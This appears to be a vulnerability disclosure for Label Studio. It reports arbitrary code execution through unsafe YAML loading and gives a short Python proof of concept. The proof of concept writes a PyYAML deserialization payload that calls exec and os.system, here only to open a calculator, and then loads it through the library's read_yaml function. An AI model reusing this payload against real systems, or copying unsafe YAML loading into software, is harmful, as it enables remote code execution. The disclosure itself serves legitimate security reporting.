# Description

`Label Studio` is a swiss army knife of data labeling and annotation tools  which is vulnerable to `Arbitrary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip3 install label-studio
```

### Run exploit.py
```
import os
#os.sysem('pip3 install label-studio')
from label_studio.utils import io
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(payload)
io.read_yaml('config.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
